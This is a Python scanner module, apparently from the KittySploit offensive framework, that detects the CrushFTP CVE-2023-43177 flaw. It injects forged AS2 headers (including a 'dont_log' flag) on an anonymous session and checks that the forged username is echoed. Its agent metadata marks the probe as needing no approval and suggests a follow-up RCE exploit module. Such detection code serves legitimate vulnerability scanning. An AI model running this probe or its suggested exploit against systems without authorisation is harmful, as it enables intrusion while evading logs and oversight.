#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CrushFTP session hijacking + JDBC driver RCE (CVE-2023-43177) detection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CrushFTP CVE-2023-43177 Detection',
        'description': (
            'Detects CVE-2023-43177 by confirming AS2 header injection on an '
            'anonymous session (getUsername reflects forged user_name).'
        ),
        'author': ['Ryan Emmons', 'KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'crushftp', 'rce', 'unauth',
            'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'tech_hints_any': ['crushftp'],
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': ''},
                ],
                'suggested_followups': [
                    'exploits/multi/http/crushftp_cve_2023_43177_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-43177',
            'https://convergetp.com/2023/11/16/crushftp-zero-day-cve-2023-43177-discovered/',
        ],
        'cve': 'CVE-2023-43177',
    }

    port = OptPort(8080, 'CrushFTP HTTP port', True)
    ssl = OptBool(False, 'Use HTTPS', True, advanced=True)

    def _is_crushftp(self) -> bool:
        r = self.http_request(
            method='GET',
            path='/WebInterface/login.html',
            allow_redirects=False,
        )
        if not r or int(r.status_code or 0) != 200:
            return False
        return 'crushftp' in (r.text or '').lower()

    def _anon_cookie(self) -> str | None:
        if getattr(self, '_owns_session', True):
            self.session.cookies.clear()
        r = self.http_request(method='GET', path='/WebInterface/', allow_redirects=True)
        if not r:
            return None
        for header in (r.headers.get('Set-Cookie', ''), str(r.headers)):
            match = re.search(r'CrushAuth=(\d{13}_[A-Za-z0-9]{30})', header)
            if match:
                return match.group(1)
        return None

    def _probe_as2(self, cookie: str) -> bool:
        token = self.random_text(10)
        r = self.http_request(
            method='POST',
            path='/WebInterface/function/',
            params={'command': 'getUsername'},
            headers={
                'as2-to': self.random_text(8),
                'user_ip': '127.0.0.1',
                'dont_log': 'true',
                'user_name': token,
            },
            data={'c2f': cookie[-4:]},
            cookies={'CrushAuth': cookie, 'currentAuth': cookie[-4:]},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        return 'success' in body and token in body

    def run(self):
        if not self._is_crushftp():
            return False
        cookie = self._anon_cookie()
        if not cookie or not self._probe_as2(cookie):
            return False
        self.set_info(
            severity='critical',
            reason='CrushFTP CVE-2023-43177 AS2 session injection confirmed',
            path='/WebInterface/function/',
            evidence='forged user_name echoed in getUsername',
        )
        return True
